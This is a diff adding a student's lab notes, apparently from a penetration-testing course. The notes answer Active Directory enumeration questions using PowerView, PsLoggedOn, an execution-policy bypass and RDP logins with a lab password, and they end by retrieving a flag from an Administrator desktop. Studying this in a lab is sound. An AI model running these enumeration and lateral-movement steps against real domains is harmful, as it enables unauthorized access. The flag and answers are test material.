@@ -1,0 +1,44 @@
+Questions 2
+Start VM Group 1 and log in to CLIENT75 as stephanie. Repeat the enumeration steps outlined in this section to find the logged on sessions. Which service must be enabled on the remote machine to make it possible for PsLoggedOn to enumerate sessions?
+Remote Registry
+
+xfreerdp /u:stephanie /d:corp.com /v:192.168.173.75 
+Password: LegmanTeamBenzoin!!
+
+# Open powershell
+powershell -ep bypass
+cd C:\Tools
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Find-LocalAdminAccess
+client74.corp.com
+PS C:\Tools\PSTools> .\PsLoggedon.exe \\client74
+
+Questions 3
+Start VM Group 2 and log in to CLIENT75 as stephanie. Find out which new machine stephanie has administrative privileges on, then log in to that machine and obtain the flag from the Administrator Desktop.
+
+HINT
+Check if PowerShell needs to have the execution policy bypassed.
+The command to use is shown in Listing 45 in this section.
+It is possible to use RDP to gain access to the machine that has been identified.
+
+xfreerdp /u:stephanie /d:corp.com /v:192.168.173.75 
+Password: LegmanTeamBenzoin!!
+
+# Open powershell
+powershell -ep bypass
+cd C:\Tools
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> cd PSTools
+PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04
+...
+     5/12/2024 2:29:23 AM       CORP\stephanie
+...
+nslookup web04
+
+xfreerdp /u:stephanie /d:corp.com /v:192.168.173.72
+Password: LegmanTeamBenzoin!!
+
+PS C:\Users\Administrator\Desktop> type .\proof.txt
+OS{318b715b0df45c60e1d21f71e46920d5}
+
+
